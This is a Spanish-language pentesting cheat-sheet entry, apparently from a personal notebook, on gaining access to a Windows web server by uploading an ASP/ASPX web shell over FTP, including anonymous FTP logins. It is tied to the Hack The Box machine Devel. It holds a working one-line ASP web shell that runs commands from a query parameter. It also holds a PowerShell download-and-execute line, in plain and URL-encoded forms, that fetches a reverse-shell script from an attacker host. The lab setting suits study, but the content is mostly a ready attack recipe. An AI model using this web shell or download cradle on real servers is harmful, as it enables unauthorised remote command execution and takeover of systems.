## DESCRIPTION
Subir una webshell/reverse-shell de formato ".asp o .aspx" utilizando ftp.
Necesitamos un usuario y acceso al directorio web. En determinados casos está habilitado el usuario anonymous:anonymous en el servidor ftp.


#### Mas información:
+ Reverse and Web Shells


## EXPLOITATION

1. Creamos la web/reverse shell 
	* https://github.com/borjmz/aspx-reverse-shell.git 
	* POSIBLES WEB SHELL: https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/asp ó (creo que mejor) https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors
	* WEBSHELL ASP MUY SENCILLA PERO CERTERA: 
	
	```
	<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%> 
 --> LLAMAR CON ?cmd=
2. Subimos la shell utilizando FTP:

![[Pasted image 20230131134535.png]]

![[Pasted image 20230206202348.png]]
3. Accedems desde el navegador o llamamos con wget:

```
wget http://IP/shell.aspx
```

**!!NOTA IMPORTANTE!!** Para obtener una shell desde una web shell podemos usar Invoke-PowershellTcp.ps1

```
#SIN URL ENCODING
 powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.16:8080/Invoke-PowerShellTcp.ps1')
#CON URL ENCODING
http://10.10.10.116/upload/webshell.asp?cmd=powershell%20-c%20IEX%20(New-Object%20Net.Webclient).downloadstring(%27http://10.10.14.16:8080/Invoke-PowerShellTcp.ps1%27)
```
## MACHINES

* Hack The Box: Devel

